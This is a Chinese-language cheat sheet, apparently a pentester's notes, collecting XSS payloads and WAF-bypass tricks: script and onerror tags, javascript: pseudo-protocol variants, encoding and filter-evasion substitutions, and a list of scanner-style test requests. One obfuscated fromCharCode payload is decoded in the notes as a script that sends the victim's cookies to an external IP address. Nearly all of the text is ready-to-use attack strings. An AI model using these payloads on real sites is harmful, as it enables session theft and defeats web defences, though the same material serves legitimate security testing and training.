通过注入，能运行js，则存在。


## **手工测试dom型XSS:**
```
<script>alert(document.cookie)</script>
<script>alert(1)</script>
<img src="1" onerror="">
<img src="1" onerror="alert(1)"> 
<img src=x onerror=alert(233)>
<aaaa id="c" onfocus="alert(1)" tabindex=0>




<iframe src=javascript://%0aalert('iframe')>
<iframe src=javascript://qq.com%0aalert('iframe')>
//注释当前行，%a换行
<embed src="https://c0olw.github.io/pic/1.html">
<audio src=x onerror=confirm("casrc")> 

伪协议：
javascript:alert(1)
javascript://comment％0aalert(1)
//注释当前行，%a换行
javascript://qq.com%0aalert('iframe')
javascript://comment％250aalert(1)

<iframe src="javascript:alert(111)"></iframe>  //火狐/IE/谷歌都支持
<a href="javascript:alert(111)">aaa</a>
如果在a标签中可以用伪协议绕过。



F12分析前端源码，猜测后端代码
构建dom：
标签闭合
value中的值”闭合
//注释去掉后面
有实体化编码，判断是不是只实体化了",没有实体化'

“><a hrerf="javascript:alert(1)"> <
```


## **绕过黑名单/WAF注入XSS:**
<https://xz.aliyun.com/t/4067?time__1311=n4%2BxnD0DyGYQqxmw405%2BbWe4iKq0K%3DNPG8eD>
关键词输入被过滤：
```
过script,用<img> <Script> <sscriptcript> 
过alert,用prompt(),comfrim()

使用string.fromCharCode()编码后，在用函数解码
<body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));>

String.fromCharCode()里就是
<script>document.location.href='http://120.46.41.173/Jay17/127.php?Cookie='+document.cookie</script>
```

hackbar工具混淆：
```
对字母进行html编码绕过检测
如：javascript->&#106;....
```

空格输入被过滤:
```
用%0d(回车) %0a(换行) %0c  /  /**/代替
<img/src/onerror=alert(1)>1
```

括号()输入被过滤:
```
用` `代替，如：alert`1`
```

BP中有各种xss一句话，可用于绕过/报告用
![](.topwrite/assets/image_1709294242750.png)




```
GET /xss.php?name=HttP://bxss.me/t/xss.html?%00
GET /xss.php?name=test'"()&%<acx><ScRiPt >HS1L(9479)</ScRiPt>
GET /xss.php?name='"()%26%25<acx><ScRiPt%20>QZWL(9781)</ScRiPt>
GET /xss.php?name=bxss.me/t/xss.html?%00
GET /xss.php?name=test9565139 
GET /xss.php?name=test9565139<
GET /xss.php?name=acu7581%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca7581
GET /xss.php?name=acux3233%C0%BEz1%C0%BCz2a%90bcxuca3233
GET /xss.php?name={{49286*49078}}
GET /xss.php?name=test9279'();}]9817
GET /xss.php?wvstest=javascript:domxssExecutionSink(1,"'/"%3E%3Cxsstag%3E()locxss")
GET /xss.php?name=%2574%2565%2573%2574%2539%2537%2535%2530%2527%2528%2529%253B%257D%255D%2539%2534%2538%2538    # 两次 urlencode
GET /xss.php?name=test</script><script>V5vL(9783)</script>
GET /xss.php?name=test<W7PZRN>WTTZZ[!%2B!]</W7PZRN>
```

